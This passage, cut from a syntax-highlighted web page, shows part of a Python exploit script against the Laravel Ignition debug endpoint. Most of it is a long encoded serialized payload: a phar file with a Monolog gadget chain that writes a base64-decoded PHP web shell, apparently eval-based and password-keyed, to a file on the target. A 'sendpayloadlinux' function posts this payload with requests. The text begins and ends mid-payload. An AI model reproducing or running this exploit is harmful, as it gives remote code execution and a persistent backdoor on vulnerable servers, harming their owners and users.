0=63=00=7A=00=6F=00=34=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=70=00=62=00=6D=00=6C=00=30=00=61=00=57=00=46=00=73=00=61=00=58=00=70=00=6C=00=5A=00=43=00=49=00=37=00=59=00=6A=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=51=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=78=00=70=00=62=00=57=00=6C=00=30=00=49=00=6A=00=74=00=70=00=4F=00=69=00=30=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=4D=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=42=00=79=00=62=00=32=00=4E=00=6C=00=63=00=33=00=4E=00=76=00=63=00=6E=00=4D=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=33=00=56=00=79=00=63=00=6D=00=56=00=75=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4E=00=6A=00=6F=00=69=00=63=00=33=00=6C=00=7A=00=64=00=47=00=56=00=74=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4D=00=54=00=4D=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6C=00=4E=00=70=00=65=00=6D=00=55=00=69=00=4F=00=32=00=6B=00=36=00=4C=00=54=00=45=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=54=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=33=00=4D=00=36=00=4E=00=6A=00=51=00=78=00=4F=00=69=00=4A=00=6C=00=59=00=32=00=68=00=76=00=49=00=46=00=34=00=38=00=50=00=33=00=42=00=6F=00=63=00=43=00=42=00=7A=00=5A=00=58=00=4E=00=7A=00=61=00=57=00=39=00=75=00=58=00=33=00=4E=00=30=00=59=00=58=00=4A=00=30=00=4B=00=43=00=6B=00=37=00=51=00=48=00=4E=00=6C=00=64=00=46=00=39=00=30=00=61=00=57=00=31=00=6C=00=58=00=32=00=78=00=70=00=62=00=57=00=6C=00=30=00=4B=00=44=00=41=00=70=00=4F=00=30=00=42=00=6C=00=63=00=6E=00=4A=00=76=00=63=00=6C=00=39=00=79=00=5A=00=58=00=42=00=76=00=63=00=6E=00=52=00=70=00=62=00=6D=00=63=00=6F=00=4D=00=43=00=6B=00=37=00=5A=00=6E=00=56=00=75=00=59=00=33=00=52=00=70=00=62=00=32=00=34=00=67=00=52=00=53=00=68=00=65=00=4A=00=45=00=51=00=73=00=58=00=69=00=52=00=4C=00=4B=00=58=00=74=00=6D=00=62=00=33=00=49=00=6F=00=58=00=69=00=52=00=70=00=50=00=54=00=41=00=37=00=58=00=69=00=52=00=70=00=58=00=6A=00=78=00=7A=00=64=00=48=00=4A=00=73=00=5A=00=57=00=34=00=6F=00=58=00=69=00=52=00=45=00=4B=00=54=00=74=00=65=00=4A=00=47=00=6B=00=72=00=4B=00=79=00=6B=00=67=00=65=00=31=00=34=00=6B=00=52=00=46=00=74=00=65=00=4A=00=47=00=6C=00=64=00=49=00=44=00=30=00=67=00=58=00=69=00=52=00=45=00=57=00=31=00=34=00=6B=00=61=00=56=00=31=00=65=00=58=00=6C=00=34=00=6B=00=53=00=31=00=74=00=65=00=4A=00=47=00=6B=00=72=00=4D=00=56=00=34=00=6D=00=4D=00=54=00=56=00=64=00=4F=00=33=00=31=00=79=00=5A=00=58=00=52=00=31=00=63=00=6D=00=34=00=67=00=58=00=69=00=52=00=45=00=4F=00=33=00=31=00=6D=00=64=00=57=00=35=00=6A=00=64=00=47=00=6C=00=76=00=62=00=69=00=42=00=52=00=4B=00=46=00=34=00=6B=00=52=00=43=00=6C=00=37=00=63=00=6D=00=56=00=30=00=64=00=58=00=4A=00=75=00=49=00=47=00=4A=00=68=00=63=00=32=00=55=00=32=00=4E=00=46=00=39=00=6C=00=62=00=6D=00=4E=00=76=00=5A=00=47=00=55=00=6F=00=58=00=69=00=52=00=45=00=4B=00=54=00=74=00=39=00=5A=00=6E=00=56=00=75=00=59=00=33=00=52=00=70=00=62=00=32=00=34=00=67=00=54=00=79=00=68=00=65=00=4A=00=45=00=51=00=70=00=65=00=33=00=4A=00=6C=00=64=00=48=00=56=00=79=00=62=00=69=00=42=00=69=00=59=00=58=00=4E=00=6C=00=4E=00=6A=00=52=00=66=00=5A=00=47=00=56=00=6A=00=62=00=32=00=52=00=6C=00=4B=00=46=00=34=00=6B=00=52=00=43=00=6B=00=37=00=66=00=56=00=34=00=6B=00=55=00=44=00=30=00=6E=00=63=00=47=00=46=00=7A=00=63=00=79=00=63=00=37=00=58=00=69=00=52=00=57=00=50=00=53=00=64=00=77=00=59=00=58=00=6C=00=73=00=62=00=32=00=46=00=6B=00=4A=00=7A=00=74=00=65=00=4A=00=46=00=51=00=39=00=4A=00=7A=00=4E=00=6A=00=4E=00=6D=00=55=00=77=00=59=00=6A=00=68=00=68=00=4F=00=57=00=4D=00=78=00=4E=00=54=00=49=00=79=00=4E=00=47=00=45=00=6E=00=4F=00=32=00=6C=00=6D=00=49=00=43=00=68=00=70=00=63=00=33=00=4E=00=6C=00=64=00=43=00=68=00=65=00=4A=00=46=00=39=00=51=00=54=00=31=00=4E=00=55=00=57=00=31=00=34=00=6B=00=55=00=46=00=30=00=70=00=4B=00=58=00=74=00=65=00=4A=00=45=00=59=00=39=00=54=00=79=00=68=00=46=00=4B=00=45=00=38=00=6F=00=58=00=69=00=52=00=66=00=55=00=45=00=39=00=54=00=56=00=46=00=74=00=65=00=4A=00=46=00=42=00=64=00=4B=00=53=00=78=00=65=00=4A=00=46=00=51=00=70=00=4B=00=54=00=74=00=70=00=5A=00=69=00=41=00=6F=00=61=00=58=00=4E=00=7A=00=5A=00=58=00=51=00=6F=00=58=00=69=00=52=00=66=00=55=00=30=00=56=00=54=00=55=00=30=00=6C=00=50=00=54=00=6C=00=74=00=65=00=4A=00=46=00=5A=00=64=00=4B=00=53=00=6C=00=37=00=58=00=69=00=52=00=4D=00=50=00=56=00=34=00=6B=00=58=00=31=00=4E=00=46=00=55=00=31=00=4E=00=4A=00=54=00=30=00=35=00=62=00=58=00=69=00=52=00=57=00=58=00=54=00=74=00=65=00=4A=00=45=00=45=00=39=00=5A=00=58=00=68=00=77=00=62=00=47=00=39=00=6B=00=5A=00=53=00=67=00=6E=00=58=00=6E=00=77=00=6E=00=4C=00=46=00=34=00=6B=00=54=00=43=00=6B=00=37=00=59=00=32=00=78=00=68=00=63=00=33=00=4D=00=67=00=51=00=33=00=74=00=77=00=64=00=57=00=4A=00=73=00=61=00=57=00=4D=00=67=00=5A=00=6E=00=56=00=75=00=59=00=33=00=52=00=70=00=62=00=32=00=34=00=67=00=62=00=6E=00=5A=00=76=00=61=00=32=00=55=00=6F=00=58=00=69=00=52=00=77=00=4B=00=53=00=42=00=37=00=5A=00=58=00=5A=00=68=00=62=00=43=00=68=00=65=00=4A=00=48=00=41=00=75=00=49=00=69=00=49=00=70=00=4F=00=33=00=31=00=39=00=58=00=69=00=52=00=53=00=50=00=57=00=35=00=6C=00=64=00=79=00=42=00=44=00=4B=00=43=00=6B=00=37=00=58=00=69=00=52=00=53=00=4C=00=56=00=34=00=2B=00=62=00=6E=00=5A=00=76=00=61=00=32=00=55=00=6F=00=58=00=69=00=52=00=42=00=57=00=7A=00=42=00=64=00=4B=00=54=00=74=00=6C=00=59=00=32=00=68=00=76=00=49=00=48=00=4E=00=31=00=59=00=6E=00=4E=00=30=00=63=00=69=00=68=00=74=00=5A=00=44=00=55=00=6F=00=58=00=69=00=52=00=51=00=4C=00=6C=00=34=00=6B=00=56=00=43=00=6B=00=73=00=4D=00=43=00=77=00=78=00=4E=00=69=00=6B=00=37=00=5A=00=57=00=4E=00=6F=00=62=00=79=00=42=00=52=00=4B=00=45=00=55=00=6F=00=51=00=48=00=4A=00=31=00=62=00=69=00=68=00=65=00=4A=00=45=00=59=00=70=00=4C=00=46=00=34=00=6B=00=56=00=43=00=6B=00=70=00=4F=00=32=00=56=00=6A=00=61=00=47=00=38=00=67=00=63=00=33=00=56=00=69=00=63=00=33=00=52=00=79=00=4B=00=47=00=31=00=6B=00=4E=00=53=00=68=00=65=00=4A=00=46=00=41=00=75=00=58=00=69=00=52=00=55=00=4B=00=53=00=77=00=78=00=4E=00=69=00=6B=00=37=00=66=00=57=00=56=00=73=00=63=00=32=00=56=00=37=00=58=00=69=00=52=00=66=00=55=00=30=00=56=00=54=00=55=00=30=00=6C=00=50=00=54=00=6C=00=74=00=65=00=4A=00=46=00=5A=00=64=00=50=00=56=00=34=00=6B=00=52=00=6A=00=74=00=39=00=66=00=53=00=41=00=2B=00=4C=00=69=00=39=00=6D=00=64=00=57=00=4E=00=72=00=65=00=57=00=39=00=31=00=4C=00=6E=00=42=00=6F=00=63=00=43=00=49=00=37=00=63=00=7A=00=6F=00=31=00=4F=00=69=00=4A=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=62=00=47=00=56=00=32=00=5A=00=57=00=77=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4E=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=68=00=62=00=47=00=6C=00=36=00=5A=00=57=00=51=00=69=00=4F=00=32=00=49=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=4A=00=4D=00=61=00=57=00=31=00=70=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=7A=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=77=00=63=00=6D=00=39=00=6A=00=5A=00=58=00=4E=00=7A=00=62=00=33=00=4A=00=7A=00=49=00=6A=00=74=00=68=00=4F=00=6A=00=49=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=6D=00=4E=00=31=00=63=00=6E=00=4A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=32=00=6B=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=59=00=36=00=49=00=6E=00=4E=00=35=00=63=00=33=00=52=00=6C=00=62=00=53=00=49=00=37=00=66=00=58=00=31=00=39=00=42=00=51=00=41=00=41=00=41=00=47=00=52=00=31=00=62=00=57=00=31=00=35=00=42=00=41=00=41=00=41=00=41=00=41=00=4D=00=39=00=43=00=57=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=43=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=51=00=75=00=64=00=48=00=68=00=30=00=42=00=41=00=41=00=41=00=41=00=41=00=4D=00=39=00=43=00=57=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=48=00=52=00=6C=00=63=00=33=00=52=00=76=00=35=00=4F=00=50=00=6D=00=31=00=45=00=6C=00=61=00=48=00=76=00=4D=00=42=00=6E=00=46=00=53=00=54=00=2F=00=6E=00=53=00=36=00=54=00=2B=00=75=00=46=00=69=00=51=00=49=00=41=00=41=00=41=00=42=00=48=00=51=00=6B=00=31=00=43=00a</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">req</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">indent</span><span class="o">=</span><span class="mi">1</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">req</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sendpayloadlinux</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="s2">&#34;solution&#34;</span><span class="p">:</span> <span class="s2">&#34;Facade</span><span class="se">\\</span><span class="s2">Ignition</span><span class="se">\\</span><span class="s2">Solutions</span><span class="se">\\</span><span class="s2">MakeViewVariableOptionalSolution&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"> <span class="s2">&#34;parameters&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;variableName&#34;</span><span class="p">:</span><span class="s2">&#34;username&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;viewFile&#34;</span><span class="p">:</span> <span class="s2">&#34;=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=72=00=39=00=43=00=41=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=43=00=6D=00=43=00=41=00=41=00=41=00=54=00=7A=00=6F=00=7A=00=4D=00=6A=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=46=00=4E=00=35=00=63=00=32=00=78=00=76=00=5A=00=31=00=56=00=6B=00=63=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4F=00=54=00=6F=00=69=00=41=00=43=00=6F=00=41=00=63=00=32=00=39=00=6A=00=61=00=32=00=56=00=30=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=49=00=35=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=35=00=76=00=62=00=47=00=39=00=6E=00=58=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=4A=00=63=00=51=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=53=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=36=00=4E=00=7A=00=70=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=37=00=54=00=7A=00=6F=00=79=00=4F=00=54=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=45=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=63=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=41=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=55=00=32=00=6C=00=36=00=5A=00=53=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=6B=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=69=00=49=00=37=00=59=00=54=00=6F=00=78=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=59=00=54=00=6F=00=79=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=63=00=7A=00=6F=00=34=00=4D=00=44=00=41=00=36=00=49=00=6D=00=56=00=6A=00=61=00=47=00=38=00=67=00=55=00=45=00=51=00=35=00=64=00=32=00=46=00=49=00=51=00=57=00=64=00=4A=00=53=00=45=00=35=00=73=00=59=00=7A=00=4E=00=4F=00=63=00=47=00=49=00=79=00=4E=00=57=00=5A=00=6A=00=4D=00=31=00=4A=00=6F=00=59=00=32=00=35=00=52=00=62=00=30=00=74=00=55=00=64=00=45=00=46=00=6A=00=4D=00=6C=00=59=00=77=00=57=00=44=00=4E=00=53=00=63=00=47=00=4A=00=58=00=56=00=6D=00=5A=00=69=00=52=00=32=00=78=00=30=00=59=00=56=00=68=00=52=00=62=00=30=00=31=00=44=00=61=00=7A=00=64=00=52=00=52=00=31=00=5A=00=35=00=59=00=32=00=30=00=35=00=65=00=56=00=67=00=7A=00=53=00=6D=00=78=00=6A=00=52=00=7A=00=6C=00=35=00=5A=00=45=00=64=00=73=00=64=00=56=00=70=00=35=00=5A=00=33=00=64=00=4C=00=56=00=48=00=52=00=74=00=5A=00=46=00=63=00=31=00=61=00=6D=00=52=00=48=00=62=00=48=00=5A=00=69=00=61=00=55=00=4A=00=47=00=53=00=30=00=4E=00=53=00=52=00=55=00=78=00=44=00=55=00=6B=00=78=00=4C=00=57=00=48=00=52=00=74=00=59=00=6A=00=4E=00=4A=00=62=00=30=00=70=00=48=00=61=00=7A=00=6C=00=4A=00=52=00=45=00=46=00=6E=00=54=00=33=00=6C=00=53=00=63=00=46=00=42=00=49=00=54=00=6A=00=42=00=6A=00=62=00=58=00=68=00=73=00=59=00=6D=00=6C=00=6E=00=61=00=31=00=4A=00=44=00=61=00=7A=00=64=00=4B=00=52=00=32=00=74=00=79=00=53=00=33=00=6C=00=73=00=4E=00=30=00=70=00=46=00=55=00=6D=00=4A=00=4B=00=52=00=32=00=78=00=6B=00=55=00=46=00=4E=00=53=00=52=00=56=00=64=00=35=00=55=00=6E=00=42=00=59=00=56=00=6A=00=52=00=72=00=55=00=7A=00=46=00=7A=00=61=00=32=00=46=00=54=00=63=00=32=00=64=00=4E=00=55=00=30=00=46=00=74=00=53=00=55=00=52=00=46=00=4D=00=55=00=6C=00=47=00=4D=00=44=00=64=00=6D=00=57=00=45=00=70=00=73=00=5A=00=45=00=68=00=57=00=65=00=57=00=4A=00=70=00=55=00=6B=00=56=00=50=00=4D=00=7A=00=46=00=74=00=5A=00=46=00=63=00=31=00=61=00=6D=00=52=00=48=00=62=00=48=00=5A=00=69=00=61=00=55=00=4A=00=53=00=53=00=30=00=4E=00=53=00=52=00=55=00=74=00=59=00=64=00=48=00=6C=00=61=00=57=00=46=00=49=00=78=00=59=00=32=00=30=00=30=00=5A=00=31=00=6C=00=74=00=52=00=6E=00=70=00=61=00=56=00=46=00=6B=00=77=00=57=00=44=00=4A=00=57=00=64=00=56=00=6B=00=79=00=4F=00=57=00=74=00=61=00=55=00=32=00=64=00=72=00=55=00=6B=00=4E=00=72=00=4E=00=32=00=5A=00=58=00=57=00=6A=00=46=00=69=00=62=00=55=00=34=00=77=00=59=00=56=00=63=00=35=00=64=00=55=00=6C=00=46=00=4F=00=47=00=39=00=4B=00=52=00=56=00=46=00=77=00=5A=00=54=00=4E=00=4B=00=62=00=47=00=52=00=49=00=56=00=6E=00=6C=00=69=00=61=00=55=00=4A=00=70=00=57=00=56=00=68=00=4F=00=62=00=45=00=35=00=71=00=55=00=6D=00=5A=00=61=00=52=00=31=00=5A=00=71=00=59=00=6A=00=4A=00=53=00=62=00=45=00=74=00=44=00=55=00=6B=00=56=00=4C=00=56=00=48=00=51=00=35=00=53=00=6B=00=5A=00=42=00=4F=00=55=00=6F=00=7A=00=51=00=6D=00=68=00=6A=00=4D=00=30=00=31=00=75=00=54=00=33=00=6C=00=53=00=56=00=31=00=42=00=54=00=5A=00=48=00=64=00=5A=00=57=00=47=00=78=00=7A=00=59=00=6A=00=4A=00=47=00=61=00=30=00=70=00=36=00=63=00=32=00=74=00=57=00=52=00=44=00=42=00=75=00=54=00=54=00=4A=00=4E=00=4D=00=6C=00=70=00=55=00=51=00=6D=00=6C=00=50=00=52=00=30=00=55=00=31=00=57=00=58=00=70=00=46=00=4D=00=55=00=31=00=71=00=53=00=54=00=42=00=5A=00=55=00=32=00=4D=00=33=00=59=00=56=00=64=00=5A=00=62=00=32=00=46=00=59=00=54=00=6E=00=70=00=61=00=57=00=46=00=46=00=76=00=53=00=6B=00=59=00=35=00=55=00=56=00=51=00=78=00=54=00=6C=00=56=00=58=00=65=00=56=00=4A=00=52=00=57=00=46=00=4E=00=72=00=63=00=47=00=56=00=35=00=55=00=6B=00=64=00=51=00=56=00=54=00=68=00=76=00=55=00=6C=00=4E=00=6F=00=55=00=45=00=74=00=44=00=55=00=6D=00=5A=00=56=00=52=00=54=00=6C=00=55=00=56=00=6B=00=5A=00=7A=00=61=00=31=00=56=00=47=00=4D=00=48=00=42=00=4D=00=51=00=31=00=4A=00=56=00=53=00=31=00=4E=00=72=00=4E=00=32=00=46=00=58=00=57=00=57=00=39=00=68=00=57=00=45=00=35=00=36=00=57=00=6C=00=68=00=52=00=62=00=30=00=70=00=47=00=4F=00=56=00=52=00=53=00=56=00=6B=00=35=00=55=00=55=00=31=00=55=00=35=00=54=00=31=00=64=00=35=00=55=00=6C=00=64=00=59=00=55=00=32=00=74=00=77=00=5A=00=58=00=6C=00=53=00=54=00=56=00=42=00=54=00=55=00=6D=00=5A=00=56=00=4D=00=46=00=5A=00=55=00=56=00=54=00=42=00=73=00=55=00=46=00=52=00=73=00=63=00=32=00=74=00=57=00=62=00=44=00=41=00=33=00=53=00=6B=00=56=00=46=00=4F=00=56=00=70=00=59=00=61=00=48=00=64=00=69=00=52=00=7A=00=6C=00=72=00=57=00=6C=00=4E=00=6E=00=62=00=6D=00=5A=00=44=00=59=00=33=00=4E=00=4B=00=52=00=58=00=64=00=77=00=54=00=7A=00=4A=00=4F=00=63=00=31=00=6C=00=59=00=54=00=6E=00=70=00=4A=00=52=00=55=00=34=00=33=00=59=00=30=00=68=00=57=00=61=00=57=00=4A=00=48=00=62=00=47=00=70=00=4A=00=52=00=31=00=6F=00=78=00=59=00=6D=00=31=00=4F=00=4D=00=47=00=46=00=58=00=4F=00=58=00=56=00=4A=00=52=00=7A=00=55=00=79=00=59=00=6A=00=4A=00=30=00=62=00=45=00=74=00=44=00=55=00=6E=00=64=00=4C=00=57=00=48=00=52=00=73=00=5A=00=47=00=31=00=47=00=63=00=30=00=74=00=44=00=55=00=6E=00=64=00=4D=00=61=00=55=00=6C=00=70=00=53=00=31=00=52=00=30=00=4F=00=57=00=5A=00=54=00=55=00=6C=00=4E=00=51=00=56=00=7A=00=56=00=73=00=5A=00=48=00=6C=00=43=00=52=00=45=00=74=00=44=00=61=00=7A=00=64=00=4B=00=52=00=6B=00=6C=00=30=00=55=00=47=00=30=00=31=00=4D=00=6D=00=49=00=79=00=64=00=47=00=78=00=4C=00=51=00=31=00=4A=00=43=00=56=00=33=00=6C=00=42=00=64=00=30=00=6C=00=47=00=4D=00=48=00=42=00=50=00=4D=00=6C=00=5A=00=71=00=59=00=55=00=63=00=34=00=5A=00=32=00=4D=00=7A=00=56=00=6D=00=6C=00=6A=00=4D=00=31=00=4A=00=35=00=53=00=30=00=63=00=78=00=61=00=30=00=35=00=54=00=5A=00=32=00=74=00=56=00=51=00=7A=00=52=00=72=00=56=00=6B=00=4E=00=72=00=63=00=30=00=6C=00=45=00=51=00=57=00=64=00=4D=00=51=00=30=00=46=00=34=00=54=00=6D=00=6C=00=42=00=63=00=45=00=38=00=79=00=56=00=6D=00=70=00=68=00=52=00=7A=00=68=00=6E=00=56=00=56=00=4E=00=6F=00=52=00=6B=00=74=00=46=00=51=00=6E=00=6C=00=6B=00=56=00=7A=00=52=00=76=00=53=00=6B=00=56=00=5A=00=63=00=45=00=78=00=44=00=55=00=6C=00=56=00=4C=00=55=00=32=00=73=00=33=00=57=00=6C=00=64=00=4F=00=62=00=32=00=4A=00=35=00=51=00=6E=00=70=00=6B=00=56=00=30=00=70=00=36=00=5A=00=45=00=68=00=4A=00=62=00=32=00=4A=00=58=00=55=00=54=00=46=00=4C=00=51=00=31=00=4A=00=52=00=54=00=47=00=6C=00=53=00=56=00=55=00=74=00=54=00=64=00=32=00=64=00=4E=00=56=00=46=00=6C=00=6E=00=53=00=31=00=52=00=30=00=4F=00=56=00=70=00=58=00=65=00=48=00=70=00=61=00=57=00=48=00=4E=00=72=00=57=00=44=00=46=00=4F=00=52=00=6C=00=55=00=78=00=54=00=6B=00=70=00=55=00=4D=00=44=00=56=00=69=00=53=00=6B=00=5A=00=61=00=5A=00=46=00=42=00=54=00=55=00=6B=00=64=00=50=00=4D=00=7A=00=45=00=35=00=49=00=48=00=77=00=67=00=59=00=6D=00=46=00=7A=00=5A=00=54=00=59=00=30=00=49=00=43=00=31=00=6B=00=49=00=44=00=34=00=75=00=4C=00=32=00=5A=00=31=00=59=00=32=00=74=00=35=00=62=00=33=00=55=00=75=00=63=00=47=00=68=00=77=00=49=00=6A=00=74=00=7A=00=4F=00=6A=00=55=00=36=00=49=00=6D=00=78=00=6C=00=64=00=6D=00=56=00=73=00=49=00=6A=00=74=00=4F=00=4F=00=33=00=31=00=39=00=63=00=7A=00=6F=00=34=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=70=00=62=00=6D=00=6C=00=30=00=61=00=57=00=46=00=73=00=61=00=58=00=70=00=6C=00=5A=00=43=00=49=00=37=00=59=00=6A=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=51=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=78=00=70=00=62=00=57=00=6C=00=30=00=49=00=6A=00=74=00=70=00=4F=00=69=00=30=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=4D=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=42=00=79=00=62=00=32=00=4E=00=6C=00=63=00=33=00=4E=00=76=00=63=00=6E=00=4D=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=33=00=56=00=79=00=63=00=6D=00=56=00=75=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4E=00=6A=00=6F=00=69=00=63=00=33=00=6C=00=7A=00=64=00=47=00=56=00=74=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4D=00=54=00=4D=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6C=00=4E=00=70=00=65=00=6D=00=55=00=69=00=4F=00=32=00=6B=00=36=00=4C=00=54=00=45=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=54=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=33=00=4D=00=36=00=4F=00=44=00=41=00=77=00=4F=00=69=00=4A=00=6C=00=59=00=32=00=68=00=76=00=49=00=46=00=42=00=45=00=4F=00=58=00=64=00=68=00=53=00=45=00=46=00=6E=00=53=00=55=00=68=00=4F=00=62=00=47=00=4D=00=7A=00=54=00=6E=00=42=00=69=00=4D=00=6A=00=56=00=6D=00=59=00=7A=00=4E=00=53=00=61=00=47=00=4E=00=75=00=55=00=57=00=39=00=4C=00=56=00=48=00=52=00=42=00=59=00=7A=00=4A=00=57=00=4D=00=46=00=67=00=7A=00=55=00=6E=00=42=00=69=00=56=00=31=00=5A=00=6D=00=59=00=6B=00=64=00=73=00=64=00=47=00=46=00=59=00=55=00=57=00=39=00=4E=00=51=00=32=00=73=00=33=00=55=00=55=00=64=00=57=00=65=00=57=00=4E=00=74=00=4F=00=58=00=6C=00=59=00=4